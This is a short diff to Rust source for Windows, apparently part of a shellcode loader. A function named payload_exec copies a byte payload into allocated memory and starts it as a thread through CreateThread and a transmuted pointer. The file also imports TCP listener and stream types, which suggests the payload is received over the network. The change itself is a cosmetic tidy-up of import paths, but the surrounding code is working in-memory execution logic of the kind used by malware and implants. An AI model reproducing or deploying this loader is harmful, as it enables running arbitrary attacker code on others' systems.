@@ -3,6 +3,7 @@ use std::io::BufReader;
 use std::io::Read;
 use std::net::{TcpListener, TcpStream};
 use std::os::windows::io::AsRawSocket;
+use std::{mem, ptr};
 use windows::Win32::System::{Memory::*, Threading::*};
 
 /// Implement the main logic of the program
@@ -71,12 +72,12 @@ fn payload_exec(payload: &[u8]) {
 
     // Copy and execute the payload
     unsafe {
-        std::ptr::copy_nonoverlapping(payload.as_ptr(), ptr as *mut u8, payload.len());
+        ptr::copy_nonoverlapping(payload.as_ptr(), ptr as *mut u8, payload.len());
         #[allow(clippy::missing_transmute_annotations)]
         let _ = CreateThread(
             None,
             0,
-            Some(std::mem::transmute(ptr)),
+            Some(mem::transmute(ptr)),
             None,
             THREAD_CREATION_FLAGS(0),
             None,
